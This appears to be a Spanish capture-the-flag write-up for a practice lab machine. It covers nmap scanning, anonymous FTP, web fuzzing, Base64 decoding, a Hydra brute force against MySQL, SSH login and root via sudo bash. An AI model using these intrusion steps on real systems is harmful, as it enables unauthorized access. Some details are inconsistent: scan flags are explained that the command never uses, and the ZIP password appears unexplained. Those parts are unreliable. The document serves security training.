

# **Informe de Escaneo de Puertos y Enumeración**
*Máquina: TheHackersLabs - Avengers Ethical Hacking*

---

## **🔍 1. Reconocimiento Inicial**

### **1.1 Verificación de Conectividad**
Se confirmó la accesibilidad al objetivo mediante `ping`:
```bash
ping 192.168 -c 1
```
**Resultado:**
```
64 bytes from 192.168: icmp_seq=1 ttl=64 time=6.59 ms
--- 192.168 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

---

## **🔎 2. Escaneo y Enumeración con Nmap**

### **2.1 Comando Utilizado**
```bash
nmap -sVC -p- -n --min-rate 5000 192.168
```
**Parámetros:**
- `-p-`: Escaneo de **todos los puertos** (65535).
- `-sS`: **TCP SYN Scan** (rápido y sigiloso).
- `-sC`: Ejecución de **scripts básicos** de reconocimiento.
- `-sV`: Detección de **versiones de servicios**.
- `--min-rate 5000`: **5000 paquetes/seg** para optimizar velocidad.
- `-n`: **Sin resolución DNS** (evita retrasos).
- `-Pn`: **Omite discovery de hosts** (ignora ICMP).

---

### **2.2 Resultados del Escaneo**
```markdown
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.52 (Ubuntu)
3306/tcp open  mysql       MySQL 8.0.36-0ubuntu0.22.04.1
```
**Hallazgos clave:**
- **FTP (21)**: Permite acceso anónimo (`vsftpd 3.0.5`).
- **SSH (22)**: Versión vulnerable a ataques de fuerza bruta (`OpenSSH 8.9p1`).
- **HTTP (80)**: Servidor web con directorios ocultos.
- **MySQL (3306)**: Base de datos accesible desde red.

---

## **🚀 3. Obtención de Acceso**

### **3.1 Explotación de FTP Anónimo**
**Comando:**
```bash
ftp 192.168
```
**Credenciales:** `anonymous` (sin contraseña).

**Archivos encontrados:**
- `FLAG.txt` → **Flag 3/9**.
- `credential_mysql.txt.zip` → **Zip protegido con contraseña**.

**Contenido de `FLAG.txt`:**
```
###     ###                         ##
## ##     ##                        ####
#        ##      ####     ### ##   ####
####       ##         ##   ##  ##     ##
##        ##      #####   ##  ##     ##
##        ##     ##  ##    #####
####      ####     #####       ##     ##
                            #####

Alright, you have flag 3/9.
This flag is worth 10 points.
```

---

### **3.2 Fuzzing Web con Gobuster**
**Comando:**
```bash
gobuster dir -u http://192.168-t 20 \
  -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt \
  -x 'txt,php,html'
```
**Directorios críticos:**
- `/robots.txt` → Contiene rutas bloqueadas: `/webs/`, `/mysql/`.
- `/database.html` → **Contraseña en Base64**:
  ```
  V201V2JHTnVjR2haYmtveFpFZEZQUT09
  ```
  **Decodificación (3 veces):**
  ```bash
  echo "V201V2JHTnVjR2haYmtveFpFZEZQUT09" | base64 -d | base64 -d | base64 -d
  ```
  **Resultado:** `fuerzabruta`

---

### **3.3 Acceso al Panel Web**
- **`/webs/developers.html`**: Login con usuario `hulk` y contraseña `fuerzabruta`.
- **`/webs/secret.html`**: Buscador con mensaje:
  > *"Solo para los más valientes hackers"*.
  Al ingresar `fuerzabruta`, revela:
  > **Usuario:** `hulk` | **Contraseña:** `fuerzabruta`.

---

### **3.4 Conexión por SSH**
```bash
ssh hulk@192.168
```
**Credenciales:**
- Usuario: `hulk`
- Contraseña: `fuerzabruta`

**Comandos clave:**
```bash
sudo -l  # No permitido para hulk
ls       # Directorios: db/, mysql/, user.txt, wait
```

---

## **🔐 4. Escalada de Privilegios**

### **4.1 Descifrado del ZIP de MySQL**
**Archivo:** `credential_mysql.txt.zip` (contraseña: `shit_how_they_did_know_this_password`).

**Contenido del ZIP:**
```txt
Listen, stif, I sent you the password of my MySQL user by email...
User: hulk
Password: fuerzabrutaXXXX  (XXXX = 0-3000)
```

**Generación de diccionario:**
```bash
seq -w 0 3000 | awk '{print "fuerzabruta"$0}' > diccionario.txt
```

**Fuerza bruta con Hydra:**
```bash
hydra -l hulk -P diccionario.txt mysql://192.168
```
**Resultado:** `fuerzabruta2024` (correcta).

---

### **4.2 Conexión a MySQL**
```bash
mysql -h 192.168 -u hulk -p --skip-ssl
```
**Base de datos `no_db`:**
```sql
SELECT * FROM users;
```
| id | user  | password       |
|----|-------|----------------|
| 1  | stif  | escudoamerica  |
| 2  | hulk  | fuerza*****    |
| 3  | antman| ******         |
| 4  | thanos| NOPASSWD       |

```sql
SELECT * FROM passwords;
```
**Contraseña en Base64:**
```
wr9UZSBjcmVlcyBxdWUgc2VyaWEgdGFuIGZhY2lsPyBKQUpBSkFKQUpKQUpB
```
**Decodificación:**
```bash
echo "wr9UZSBjcmVlcyBxdWUgc2VyaWEgdGFuIGZhY2lsPyBKQUpBSkFKQUpKQUpB" | base64 -d
```
**Resultado:** `¿Crees que seria tan facil? JAJAJAJA`

---

### **4.3 Acceso como `stif` y Escalada a Root**
```bash
su stif
sudo -l  # Permite ejecutar /usr/bin/bash como root
sudo bash
whoami   # root
```

**Flags obtenidas:**
| Flag | Puntuación | Ubicación          |
|------|------------|--------------------|
| 1/9  | 10 pts     | `/flags/FLAG.txt` |
| 3/9  | 10 pts     | FTP (`FLAG.txt`)   |
| 4/9  | 10 pts     | MySQL (`db_flag`)  |
| 5/9  | 10 pts     | `/db/no_flag/flag`|

---

## **🎯 Conclusiones y Recomendaciones**

### **Vulnerabilidades Explotadas:**
1. **FTP anónimo**: Configuración insegura que permitió acceso a archivos sensibles.
2. **Contraseñas débiles**: Uso de `fuerzabruta` + números predecibles.
3. **Codificación Base64**: Múltiples capas de encoding para ocultar información.
4. **Permisos excesivos**: Usuario `stif` podía ejecutar `bash` como root.

